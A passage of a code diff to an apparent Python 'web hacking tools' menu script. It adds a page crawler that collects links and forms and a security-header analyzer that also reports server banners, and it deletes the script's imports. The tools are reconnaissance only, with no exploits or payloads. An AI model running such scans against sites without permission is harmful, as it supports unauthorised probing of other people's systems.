+                except Exception as e:
+                    print(f"{RED}[-] Failed: {page_url}{RESET}")
+
+            try:
+                while to_visit and len(visited) < 50:  # Limit to 50 pages
+                    current_url = to_visit.pop(0)
+                    crawl_page(current_url)
+
+                print(f"\n{GREEN}[+] Crawling completed!{RESET}")
+                print(f"{GREEN}[+] Internal pages found: {len(visited)}{RESET}")
+                print(f"{GREEN}[+] External links found: {len(external_links)}{RESET}")
+                print(f"{GREEN}[+] Forms found: {len(forms)}{RESET}")
+
+            except KeyboardInterrupt:
+                print(f"\n{YELLOW}[!] Crawling interrupted by user{RESET}")
+
+        def header_analyzer(self):
+            print(f"\n{CYAN}[=== HEADER SECURITY ANALYZER ===]{RESET}")
+            url = input("[?] Enter target URL: ").strip()
+
+            if not url.startswith(('http://', 'https://')):
+                url = 'http://' + url
+
+            try:
+                response = self.session.get(url, headers=self.get_headers(), timeout=10)
+
+                print(f"\n{GREEN}[+] SECURITY HEADER ANALYSIS{RESET}")
+                print(f"{GREEN}{'=' * 60}{RESET}")
+
+                security_checks = {
+                    'X-Frame-Options': {
+                        'check': lambda h: 'X-Frame-Options' in h,
+                        'message': 'Protects against clickjacking',
+                        'good': ['DENY', 'SAMEORIGIN']
+                    },
+                    'X-Content-Type-Options': {
+                        'check': lambda h: 'X-Content-Type-Options' in h and h['X-Content-Type-Options'] == 'nosniff',
+                        'message': 'Prevents MIME type sniffing',
+                        'good': ['nosniff']
+                    },
+                    'X-XSS-Protection': {
+                        'check': lambda h: 'X-XSS-Protection' in h,
+                        'message': 'Enables XSS protection',
+                        'good': ['1', '1; mode=block']
+                    },
+                    'Strict-Transport-Security': {
+                        'check': lambda h: 'Strict-Transport-Security' in h,
+                        'message': 'Enforces HTTPS',
+                        'good': ['max-age=']
+                    },
+                    'Content-Security-Policy': {
+                        'check': lambda h: 'Content-Security-Policy' in h,
+                        'message': 'Content Security Policy',
+                        'good': ['default-src', 'script-src']
+                    },
+                    'Referrer-Policy': {
+                        'check': lambda h: 'Referrer-Policy' in h,
+                        'message': 'Controls referrer information',
+                        'good': ['no-referrer', 'strict-origin']
+                    }
+                }
+
+                for header, info in security_checks.items():
+                    if info['check'](response.headers):
+                        value = response.headers.get(header, '')
+                        if any(good in value for good in info['good']):
+                            print(f"{GREEN}[✓] {header}: {value}{RESET}")
+                        else:
+                            print(f"{YELLOW}[!] {header}: {value} - {info['message']}{RESET}")
+                    else:
+                        print(f"{RED}[✗] {header}: MISSING - {info['message']}{RESET}")
+
+                # Server information
+                print(f"\n{GREEN}[+] SERVER INFORMATION{RESET}")
+                print(f"{GREEN}{'=' * 60}{RESET}")
+                for header in ['Server', 'X-Powered-By', 'X-AspNet-Version']:
+                    if header in response.headers:
+                        print(f"{YELLOW}[*] {header}: {response.headers[header]}{RESET}")
+
+            except Exception as e:
+                print(f"{RED}[-] Error: {e}{RESET}")
 
         def main(self):
             self.banner()
@@ -960,6 +1461,10 @@ def web_hacking_tools():
                     self.website_info()
                 elif choice == '7':
                     self.admin_panel_finder()
+                elif choice == '8':
+                    self.crawler()
+                elif choice == '9':
+                    self.header_analyzer()
                 elif choice == '0':
                     print(f"\n{GREEN}[+] Returning to main menu...{RESET}")
                     break
@@ -973,15 +1478,7 @@ def web_hacking_tools():
 
 
 # !/usr/bin/env python3
-import os
-import sys
-import time
-import socket
-import threading
-import random
-import requests
-import hashlib  # Add this import
-from concurrent.futures import ThreadPoolExecutor
+
 
 GREEN = "\033[1;32m"
 RED = "\033[1;31m"
